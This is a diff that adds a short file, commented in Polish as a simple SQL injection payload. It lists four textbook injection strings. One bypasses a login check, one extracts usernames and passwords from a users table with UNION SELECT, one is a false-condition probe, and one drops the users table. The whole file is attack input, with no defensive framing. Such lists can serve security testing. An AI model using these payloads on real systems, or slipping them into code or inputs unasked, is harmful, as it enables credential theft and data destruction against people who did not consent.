@@ -1,0 +1,5 @@
+-- Prosty payload SQL Injection
+' OR 1=1 --
+' UNION SELECT username, password FROM users --
+' AND 1=0 --
+' DROP TABLE users --
